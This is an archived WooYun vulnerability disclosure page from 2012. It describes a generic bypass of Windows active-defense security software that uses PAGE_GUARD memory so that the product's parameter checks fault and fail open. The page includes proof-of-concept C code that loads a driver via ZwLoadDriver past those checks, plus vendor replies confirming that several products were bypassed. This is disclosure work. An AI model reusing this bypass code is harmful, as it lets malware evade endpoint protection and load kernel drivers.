@@ -1,0 +1,218 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		主动防御类软件的通用实现漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		主动防御类软件的通用实现漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/rhett">rhett</a> 
+</li><li>提交时间：		2012-10-09 15:54</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-10-09：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-10-12：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-10-15：	细节向第三方安全合作伙伴开放<br/>
+									2012-10-22：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-11-01：	细节向普通白帽子公开<br/>
+									2012-11-21：	细节向实习白帽子公开<br/>
+									2012-11-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">主动防御类软件在实现上存在一个通用的漏洞，恶意软件可以借此绕过安全检查执行恶意行为</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">主防会拦截系统的一些关键操作，在这些监控点上做参数检查。因为参数往往来自用户态，所以参数检查的过程是在一个__try里面，防止访问违规造成crash。一般的模式类似如下：<br />
+<br />
+</p><pre><code>bool bPass = true;<br />
+<br />
+__try<br />
+{<br />
+    bPass = check_paramters(p1,p2,p3);  // p为参数   <br />
+}<br />
+__except(1)<br />
+{<br />
+    bPass = true;<br />
+}<br />
+<br />
+return (bPass ? status_success : status_access_denied);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+上面只是伪代码，意思是对参数进行检查，如果发现有恶意行为，那么返回拒绝，不允许执行。（实际远比这复杂，对参数会经过很多策略检查。结果也不是直接返回，有可能弹框由用户决策）。问题在于，如果访问参数的时候出现异常，那么后续的处理只好放过这个行为。问题就在这里，如果可以让主防访问参数出现异常，但是系统实际使用参数的时候却可以正常，那么主防的检查就被绕过了。这不是不可能，否则就不是漏洞！windows在内存管理上有个独特的地方，叫做PAGE_GUARD。对一段内存空间设置PAGE_GUARD属性后，对这部分内存的首次访问就会出现异常，后续访问则正常。所以，通过利用这个机制，加上对安全软件的检测和试验，上述的漏洞就可以很好的被利用了。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>pStr = (PUNICODE_STRING)VirtualAlloc(NULL,PAGE_SIZE,MEM_COMMIT,PAGE_READWRITE);<br />
+	if(!pStr)<br />
+	{<br />
+		_tprintf(_T(&quot;Alloc Str Failed\n&quot;));<br />
+		goto __Cleanup;<br />
+	}<br />
+	pStr-&gt;Length = (USHORT)(wcslen(SERVICE_PATH) * sizeof(WCHAR));<br />
+	pStr-&gt;MaximumLength = pStr-&gt;Length + sizeof(WCHAR);<br />
+	pStr-&gt;Buffer = (PWSTR)(pStr + 1);<br />
+	wcscpy_s(pStr-&gt;Buffer,pStr-&gt;MaximumLength / sizeof(WCHAR),p);<br />
+	//STATUS_SUCCESS<br />
+	if(!VirtualProtect(pStr,PAGE_SIZE,PAGE_READWRITE | PAGE_GUARD,&amp;dwOldProt))<br />
+	{<br />
+		_tprintf(_T(&quot;VirtualProtect Failed\n&quot;));<br />
+		goto __Cleanup;<br />
+	}<br />
+	<br />
+	if((status = ZwLoadDriver(pStr)) != 0)<br />
+	{<br />
+		_tprintf(_T(&quot;ZwLoadDriver Failed status = %x\n&quot;),status);<br />
+		goto __Cleanup;<br />
+	}<br />
+<br />
+	_tprintf(_T(&quot;ZwLoadDriver Successfully\n&quot;));</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">自己研究...<br />
+<br />
+<br />
+<br />
+感谢 newtongao 和 garymao<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/rhett" title="rhett">rhett</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-013160" title="主动防御类软件的通用实现漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-10-12 22:40</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">根据近几日的跟踪，CNVD暂未直接在相关软件实例上复现，不过已认可进行绕过的这个思路，马其诺防线的绕过也是如此。<br />
+<br />
+12日，CNVD已经向启明星辰、绿盟、东软、奇虎、天融信、安氏、安天、恒安嘉新等具备终端检测或网络侧防护产品的CNVD成员单位下发漏洞自查确认任务，待各单位17日后反馈。<br />
+<br />
+最新情况将跟踪反馈，同时CNVD秘书处也将进行技术研判监督。<br />
+<br />
+暂不按危害后果评分，思路很赞，rank 20</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2012-10-15：15日，天融信公司首先反馈测试情况，确认漏洞机理以及复现部分过程。同时，根据rhett的成果发现一些其他新的技术细节。</p>
+												<p class="detail">2012-10-17：10月16日，根据安天公司测试反馈结果，对6款主流安全防护软件的测试结果表明，使用该思路的绕过技术可绕过4款产品当前版本的查杀，并使得其中两款产品主机蓝屏。</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="13160";
+var bugRating="2";
+var myRating="";
+var ratingCount="5";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
